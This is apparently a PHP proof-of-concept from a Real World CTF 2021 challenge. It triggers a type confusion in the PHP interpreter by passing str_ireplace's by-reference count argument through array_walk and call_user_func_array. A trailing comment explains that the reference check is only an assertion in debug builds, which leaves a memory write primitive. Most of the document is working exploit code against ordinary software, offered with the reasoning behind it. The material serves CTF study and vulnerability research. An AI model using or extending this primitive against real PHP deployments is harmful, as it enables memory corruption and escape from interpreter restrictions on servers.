<?php  
//author: https://github.com/wupco/ 
//realworldctf 2021 MoP https://realworldctf.com/challenge
class A{  
   function __construct(){  
     // str_ireplace could be replaced by other functions which have "reference args" such as similar_text etc.
        $this->{'str_ireplace'} = "call_user_func_array";                                                
   }  
}  

$dummy='aaa';

$type_confusion ="AAAAAAAAA"; 

//arguments list
$args = array("a","b","a",$type_confusion);  
array_walk(new A(), "call_user_func", $args); 
print_r($type_confusion);


/*
	To be honest , its hard to find out that Oday with the only hint. but its interesting!

	use the callable param, u can bypass the php type hint!

	then let us look the important part that php_str_replace_common function

	//... 
	if (zcount) {
		ZEND_TRY_ASSIGN_REF_LONG(zcount, count);
	}
	
	the last param of these str_replace function is for record the number of replacements performed. so it must be reference, if its not reference? what will happened then?

	#define ZEND_TRY_ASSIGN_REF_LONG(zv, lval) do { \
		ZEND_ASSERT(Z_ISREF_P(zv)); \
		_ZEND_TRY_ASSIGN_LONG(zv, lval, 1); \
	} while (0)
	
	damn, php will check it again, through we bypass the type hint. but zend_assert only work at debug-mode ! and there is no second check after that!

	so we will have a type confusion! actually its write primitive.	
*/